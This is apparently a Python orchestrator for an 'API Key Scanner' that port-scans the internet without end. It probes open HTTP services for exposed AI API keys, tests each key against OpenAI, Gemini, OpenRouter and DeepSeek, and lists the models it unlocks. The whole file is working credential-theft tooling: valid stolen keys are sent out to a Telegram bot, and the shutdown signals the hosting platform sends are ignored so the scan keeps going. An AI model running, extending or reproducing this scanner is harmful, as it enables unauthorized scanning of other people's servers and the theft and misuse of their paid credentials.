"""
Orchestrator — TRUE infinity mode. Streams IPs continuously, no batch gaps.
Handle Render SIGTERM gracefully (restart loop, don't die).
"""
import asyncio
import logging
import os
import time
import signal
from typing import Optional

from ip_generator import IPGenerator
from port_scanner import PortScanner
from http_probe import HTTPProbe, KeyValidator
from telegram_bot import TelegramNotifier

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("orchestrator")


class APIKeyScanner:
    """Continuous IP scanner — streams IPs, no batches, no gaps."""

    def __init__(
        self,
        scan_timeout: float = 0.8,
        http_timeout: float = 3.0,
        max_concurrent_scanning: int = 10000,
        stats_interval_secs: int = 15,
        use_telegram: bool = True,
    ):
        self.stats_interval = stats_interval_secs
        self.use_telegram = use_telegram

        # Components — no semaphores, raw async
        self.ip_gen = IPGenerator()
        self.port_scanner = PortScanner(timeout=scan_timeout)
        self.http_probe = HTTPProbe(timeout=http_timeout)
        self.key_validator = KeyValidator(timeout=8.0)
        self.telegram = TelegramNotifier() if use_telegram else None

        # Concurrency control — just a semaphore on the total scanning work
        self.scan_sem = asyncio.Semaphore(max_concurrent_scanning)

        # Stats
        self.ips_scanned = 0
        self.ports_found = 0
        self.keys_found = 0
        self.keys_valid = 0
        self.start_time: Optional[float] = None
        self._running = False
        self._restart_requested = False

    async def process_one_ip(self, ip: str):
        """Full pipeline for ONE IP — scan → probe → validate → notify."""
        async with self.scan_sem:
            try:
                # Step 1: Port scan (all ports in parallel per IP)
                open_ports = await self.port_scanner.scan_ip(ip)
                if not open_ports:
                    return

                self.ports_found += len(open_ports)

                # Log open ports periodically for diagnostics
                if self.ports_found <= 100 or self.ports_found % 50 == 0:
                    logger.info(f"OPEN PORTS on {ip}: {open_ports}")

                # Step 2: HTTP probe every open port for keys
                for port in open_ports:
                    keys = await self.http_probe.probe_ip_port(ip, port)
                    if not keys:
                        continue

                    self.keys_found += len(keys)
                    logger.info(f"Found {len(keys)} key(s) on {ip}:{port}")

                    # Step 3: Validate every key
                    valid = await self.key_validator.validate_batch(keys)
                    for vk in valid:
                        self.keys_valid += 1
                        logger.info(f"✅ VALID {vk.provider} key — {ip}:{port}")

                        # Step 4: Get models & notify
                        models = await self._fetch_models(vk)
                        if self.telegram:
                            await self.telegram.notify_key_found(
                                provider=vk.provider,
                                key=vk.key,
                                ip=vk.source_ip,
                                port=vk.source_port,
                                endpoint=vk.endpoint,
                                models=models,
                                validated=True,
                            )
            except Exception as e:
                logger.debug(f"Error on {ip}: {e}")

    async def _fetch_models(self, key) -> Optional[list[str]]:
        """Fetch available models for a validated key."""
        import aiohttp
        from http_probe import VALIDATION_ENDPOINTS

        prov = key.provider
        if prov not in VALIDATION_ENDPOINTS:
            return None

        cfg = VALIDATION_ENDPOINTS[prov]
        url = cfg["url"].format(key=key.key) if "{key}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"](key.key)

        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8), ssl=True) as r:
                    if r.status == 200:
                        return self._parse_models(await r.json(), prov)
        except Exception:
            return None

    def _parse_models(self, data: dict, provider: str) -> list[str]:
        try:
            if provider == "OpenAI" and "data" in data:
                return [m["id"] for m in data["data"][:125]]
            if provider == "Gemini" and "models" in data:
                return [m["name"].replace("models/", "") for m in data["models"][:125]]
            if provider == "OpenRouter" and isinstance(data, dict):
                models = data.get("data", {})
                if isinstance(models, dict):
                    models = models.get("models", models)
                if isinstance(models, list):
                    return [m.get("id", str(m)) for m in models[:20]]
            if provider == "DeepSeek" and "data" in data:
                return [m["id"] for m in data["data"][:20]]
        except Exception:
            pass
        return None

    async def _stats_loop(self):
        """Periodic stats logging + Telegram update."""
        while self._running:
            await asyncio.sleep(self.stats_interval)
            elapsed = max(time.time() - self.start_time, 0.01)
            rate = self.ips_scanned / elapsed
            logger.info(f"Scanned: {self.ips_scanned:,} | Keys: {self.keys_found} | Valid: {self.keys_valid} | Rate: {rate:.0f}/s")

            if self.telegram:
                await self.telegram.notify_stats(
                    ips_scanned=self.ips_scanned,
                    keys_found=self.keys_found,
                    keys_valid=self.keys_valid,
                    elapsed_hours=elapsed / 3600,
                )

    async def run(self):
        """TRUE infinity loop — never stops, never batches."""
        self._running = True
        self.start_time = time.time()

        logger.info("=" * 60)
        logger.info("API Key Scanner v2.0 — TRUE INFINITY MODE")
        logger.info(f"Target ports: {self.port_scanner.ports}")
        logger.info(f"Max concurrent IPs: {self.scan_sem._value}")
        logger.info(f"Stats interval: {self.stats_interval}s")
        logger.info("=" * 60)

        if self.telegram:
            await self.telegram.notify_startup(version="2.0 — INFINITY MODE")

        # Fire stats loop in background
        asyncio.create_task(self._stats_loop())

        # INFINITY LOOP — never batch, never gap
        # If restart requested, just loop back — don't die
        try:
            while self._running:
                ip = self.ip_gen.next_ip()
                self.ips_scanned += 1

                # Fire and forget — process_one_ip manages its own semaphore
                asyncio.create_task(self.process_one_ip(ip))

                # Check restart flag every 10k IPs
                if self.ips_scanned % 10000 == 0 and self._restart_requested:
                    logger.info("Restart requested — continuing loop (Render deploy)")
                    self._restart_requested = False

                # Tiny yield to keep event loop responsive
                if self.ips_scanned % 100 == 0:
                    await asyncio.sleep(0)

        except asyncio.CancelledError:
            logger.info("Scan cancelled")

    async def handle_sigterm(self):
        """Render sends SIGTERM on deploy — just log and continue."""
        if not self._restart_requested:
            logger.info("SIGTERM received (Render deploy) — continuing scan")
            self._restart_requested = True

    async def cleanup(self):
        """Final stats on actual shutdown."""
        elapsed = max(time.time() - self.start_time, 0.01) / 3600 if self.start_time else 0
        logger.info(f"Run complete: {self.ips_scanned:,} IPs, {self.keys_valid} valid keys in {elapsed:.1f}h")

        if self.telegram:
            await self.telegram.notify_stats(
                ips_scanned=self.ips_scanned,
                keys_found=self.keys_found,
                keys_valid=self.keys_valid,
                elapsed_hours=elapsed,
            )
            await self.telegram.close()


async def main():
    """Entry point."""
    scanner = APIKeyScanner(
        scan_timeout=float(os.getenv("SCAN_TIMEOUT", "0.8")),
        http_timeout=float(os.getenv("HTTP_TIMEOUT", "5.0")),
        max_concurrent_scanning=int(os.getenv("MAX_CONCURRENT_IPS", "10000")),
        stats_interval_secs=int(os.getenv("STATS_INTERVAL_SEC", "15")),
        use_telegram=os.getenv("USE_TELEGRAM", "true").lower() == "true",
    )

    # Handle SIGTERM gracefully (Render sends this on deploy)
    try:
        loop = asyncio.get_event_loop()
        loop.add_signal_handler(signal.SIGTERM, lambda: asyncio.ensure_future(scanner.handle_sigterm()))
        loop.add_signal_handler(signal.SIGINT, lambda: asyncio.ensure_future(scanner.handle_sigterm()))
    except (NotImplementedError, AttributeError):
        pass  # Windows

    try:
        await scanner.run()
    except KeyboardInterrupt:
        logger.info("Interrupted")
    finally:
        await scanner.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
